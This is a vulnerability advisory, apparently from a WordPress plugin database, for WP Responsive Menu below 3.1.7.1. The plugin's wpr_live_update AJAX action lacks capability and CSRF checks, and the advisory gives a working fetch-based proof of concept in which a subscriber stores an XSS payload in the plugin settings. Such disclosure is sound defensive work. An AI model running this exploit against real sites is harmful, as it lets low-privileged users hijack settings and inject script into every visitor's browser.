## WordPress Plugin Vulnerabilities

# WP Responsive Menu < 3.1.7.1 - Subscriber+ Settings Update to Stored XSS

### Description

The plugin does not have capability and CSRF checks in the wpr\_live\_update AJAX action, as well as do not sanitise and escape some of the data submitted. As a result, any authenticated, such as subscriber could update the plugin's settings and perform Cross-Site Scripting attacks against all visitor and users on the frontend

### Proof of Concept

fetch("https://example.com/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "action=wpr\_live\_update&wprmenu\_options[enabled]=1&wprmenu\_options[position]=\"><img src onerror=alert(/XSS/)>",
"method": "POST",
})
.then(response => response.text())
.then(function(data) {
console.log(data);
fetch("https://example.com/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "action=wpr\_get\_transient\_from\_data",
"method": "POST",
});
});
The XSS will be triggered in all frontend pages
